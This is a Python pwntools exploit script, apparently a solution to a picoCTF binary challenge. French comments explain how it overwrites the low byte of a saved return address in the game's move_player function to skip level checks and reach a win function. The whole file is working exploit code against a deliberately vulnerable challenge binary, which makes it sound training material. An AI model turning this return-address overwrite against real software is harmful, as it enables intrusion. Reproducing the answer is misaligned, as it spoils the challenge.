#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./g', checksec=False)
context.arch = 'i386'


def start():
    if args.REMOTE:
        host = args.HOST or 'saturn.picoctf.net'
        port = int(args.PORT or 62668)
        return remote(host, port)
    return process('./g')


def run_exploit(io):
    # 3 fois: finir les 3 premiers niveaux normalement
    io.sendline(b"aaaaawwwaaaawsddddp")
    io.sendline(b"aaaaawwwaaaawsddddp")
    io.sendline(b"aaaaawwwaaaawsddddp")

    # Phase 1: overwrite LSB du return de move_player -> 0x70.
    # 0x0804992c devient 0x08049970, ce qui saute les checks et force le bloc
    # "Next level starting", donc level est incremente (4 -> 5).
    io.sendline(b"aaaaawwwaaaawsddddaa" + (b"aaaa" * 12) + b"l\x70w")

    # Phase 2: overwrite LSB du return de move_player -> 0xfe.
    # 0x0804992c devient 0x080499fe, qui execute push &level ; call win.
    io.sendline(b"aaaaawwwaaaawsddddaa" + (b"aaaa" * 16) + b"l\xfew")


if __name__ == '__main__':
    io = start()
    run_exploit(io)
    io.interactive()
